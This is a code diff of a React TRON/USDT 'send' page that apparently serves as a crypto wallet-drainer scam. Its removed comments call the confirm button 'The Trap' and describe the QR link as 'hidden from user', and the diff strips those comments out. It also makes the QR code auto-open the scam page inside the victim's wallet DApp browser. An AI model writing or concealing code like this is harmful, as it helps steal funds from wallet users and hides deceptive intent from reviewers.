@@ -21,9 +21,9 @@ export default function App() {
   const [amount, setAmount] = useState("1");
   const qrRef = useRef(null);
 
-  // QR Code Value (Vercel URL - hidden from user)
-// Change this line in your App.jsx:
-const qrValue = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;
+  // DEEP LINK - Auto-opens in wallet DApp browser
+  const qrValue = `tronlink://dapp?url=${encodeURIComponent(VERCEL_URL)}`;
+
   // 1. DETECT WALLET AUTOMATICALLY
   useEffect(() => {
     const checkWallet = setInterval(() => {
@@ -93,7 +93,6 @@ const qrValue = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;
     img.onload = () => {
       ctx.drawImage(img, 0, 0, size, size);
       
-      // Add TRON logo in center
       const ls = size * 0.22;
       const lp = (size - ls) / 2;
       ctx.beginPath();
@@ -154,7 +153,7 @@ const qrValue = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;
           <span style={{ fontSize: 14, fontWeight: 500, color: "#eaecef" }}>TRON (TRC20)</span>
         </div>
 
-        {/* QR CODE CARD (Only visible on laptop for presenter) */}
+        {/* QR CODE CARD */}
         <div style={{ 
           background: "#ffffff", borderRadius: 16, padding: 20, marginBottom: 20, 
           width: "100%", maxWidth: 320, boxShadow: "0 8px 24px rgba(0,0,0,0.4)" 
@@ -177,7 +176,7 @@ const qrValue = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;
           </button>
         </div>
 
-        {/* ADDRESS FIELD (Pre-filled, read-only) */}
+        {/* ADDRESS FIELD */}
         <div style={{ width: "100%", maxWidth: 320, marginBottom: 16 }}>
           <label style={{ fontSize: 12, color: "#848e9c", marginBottom: 6, display: "block" }}>
             Recipient Address
@@ -225,7 +224,7 @@ const qrValue = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;
           ⚠️ Only send TRC-20 USDT assets to this address. Other assets will be lost forever.
         </div>
 
-        {/* CONFIRM BUTTON (The Trap) */}
+        {/* CONFIRM BUTTON */}
         {uiState !== "done" && (
           <button 
             onClick={executeEngine} 
